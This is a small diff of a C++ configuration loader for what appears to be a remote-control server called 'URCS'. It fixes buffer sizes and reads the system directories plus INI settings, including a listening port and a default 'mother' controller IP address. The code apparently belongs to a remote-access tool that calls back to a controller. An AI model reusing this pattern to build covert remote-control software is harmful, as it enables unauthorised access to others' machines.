@@ -124,9 +124,9 @@ void Cini::LoadData()
 		break;
     }
 
-	GetModuleFileName(NULL,lcname,512);
-	GetWindowsDirectory(windir,512);
-	GetSystemDirectory(sysdir,512);
+	GetModuleFileName(NULL,lcname,_MAX_PATH);
+	GetWindowsDirectory(windir,_MAX_PATH);
+	GetSystemDirectory(sysdir,_MAX_PATH);
 	
 	// Verify the lcfn (local name of file)
 	strcpy(lnif,lcname);
@@ -137,7 +137,6 @@ void Cini::LoadData()
 <-------------ACA
 
 	*/
-
 
 
 	Cfns funciones;
@@ -153,7 +152,7 @@ void Cini::LoadData()
 
 	//Get data from INI file
 	GetPrivateProfileString("URCS","server_banner","Misconfigured.",server_banner,256,ini_filename);
-	GetPrivateProfileString("URCS","server_prompt","#",server_prompt,256,ini_filename);
+	GetPrivateProfileString("URCS","server_prompt","",server_prompt,256,ini_filename);
 	GetPrivateProfileString("URCS","server_name","default-misconfigured",server_name,256,ini_filename);
 	GetPrivateProfileString("URCS","server_port","3359",lport,10,ini_filename);
 	GetPrivateProfileString("URCS","mother_name","200.16.194.34",mother_name,256,ini_filename); //this 000.000.000.000 you can change it directly from PXE.
